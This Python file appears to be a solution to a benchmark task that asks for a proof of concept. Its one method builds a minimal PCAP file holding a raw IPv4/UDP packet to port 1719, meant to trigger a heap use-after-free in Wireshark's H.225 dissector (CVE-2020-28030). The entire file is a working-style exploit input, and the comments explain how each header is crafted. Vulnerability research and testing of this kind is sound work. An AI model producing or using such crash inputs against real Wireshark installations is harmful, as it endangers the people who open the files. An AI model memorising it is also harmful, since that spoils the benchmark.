import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The problem requires generating a PoC for a Heap Use-After-Free in Wireshark's h225 dissector (CVE-2020-28030).
        # The ground truth length is 73 bytes.
        # This length corresponds to a minimal PCAP file with one packet using LinkType RAW (101).
        # Calculation:
        #   PCAP Global Header: 24 bytes
        #   PCAP Packet Header: 16 bytes
        #   IPv4 Header: 20 bytes
        #   UDP Header: 8 bytes
        #   Payload: 5 bytes
        #   Total: 73 bytes
        
        # PCAP Global Header
        # Magic: 0xa1b2c3d4 (Little Endian, microsecond resolution)
        # Version: 2.4
        # Zone/Sigfigs: 0
        # Snaplen: 65535
        # LinkType: 101 (DLT_RAW / Raw IP)
        global_header = struct.pack('<IHHIIII', 0xa1b2c3d4, 2, 4, 0, 0, 0xffff, 101)

        # IP Header
        # Version 4, IHL 5 -> 0x45
        # TOS: 0
        # Total Length: 33 (20 IP + 8 UDP + 5 Payload)
        # ID: 1
        # Flags/Frag: 0
        # TTL: 64
        # Protocol: 17 (UDP)
        # Checksum: 0 (Allowing invalid checksum for fuzzing)
        # Src/Dst IP: 127.0.0.1
        ip_header = struct.pack('!BBHHHBBH4s4s', 
                                0x45, 0, 33, 1, 0, 64, 17, 0, 
                                b'\x7f\x00\x00\x01', b'\x7f\x00\x00\x01')

        # UDP Header
        # Src Port: 12345
        # Dst Port: 1719 (H.225 RAS) - Triggers the vulnerable dissector
        # Length: 13 (8 header + 5 payload)
        # Checksum: 0
        udp_header = struct.pack('!HHHH', 12345, 1719, 13, 0)

        # Payload
        # 5 bytes minimal payload. Zeros are sufficient to be parsed as a minimal/malformed
        # H.225 RAS message (e.g., index 0) which sets up the state triggering UAF on subsequent passes.
        payload = b'\x00' * 5

        packet_data = ip_header + udp_header + payload

        # PCAP Packet Header
        # Timestamp: 0
        # Included Length: 33
        # Original Length: 33
        packet_header = struct.pack('<IIII', 0, 0, len(packet_data), len(packet_data))

        return global_header + packet_header + packet_data
